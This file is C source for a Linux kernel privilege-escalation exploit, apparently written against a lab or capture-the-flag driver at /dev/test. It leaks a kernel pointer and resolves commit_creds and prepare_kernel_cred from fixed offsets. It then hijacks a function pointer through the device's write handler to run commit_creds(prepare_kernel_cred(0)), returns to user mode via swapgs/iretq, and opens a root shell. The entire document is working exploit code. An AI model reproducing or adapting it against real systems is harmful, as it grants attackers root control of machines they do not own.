//gcc -masm=intel -static -o exp exp.c -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdint.h>

unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);
unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred);

struct register_val {
    uint64_t user_rip;
    uint64_t user_cs;
    uint64_t user_rflags;
    uint64_t user_rsp;
    uint64_t user_ss;
} __attribute__((packed));

struct register_val rv;

void shell(void) {
    execl("/bin/sh", "sh", NULL);
}

void backup_rv(void) {
    asm("mov rv+8, cs;"
        "pushf; pop rv+16;"
        "mov rv+24, rsp;"
        "mov rv+32, ss;"
       );
    rv.user_rip = &shell;
}

void payload(void) {
    commit_creds(prepare_kernel_cred(0));
    asm("swapgs;"
        "mov %%rsp, %0;"
        "iretq;"
        : : "r" (&rv));
}

int main() {
    int fd;
    void *ptr = 0;
    void *leak = 0;
    void *kbase = 0;
    
    fd = open("/dev/test", O_RDWR);

    read(fd, &leak, 0);
    printf("leak : %p\n", leak);
    
    kbase = leak - 0xbedb9;
    commit_creds = kbase + 0x8e9f0;
    prepare_kernel_cred = kbase + 0x8ec20;

    ptr = &payload;

    backup_rv();

    write(fd, &ptr, sizeof(ptr));

    close(fd);

    return 0;
}
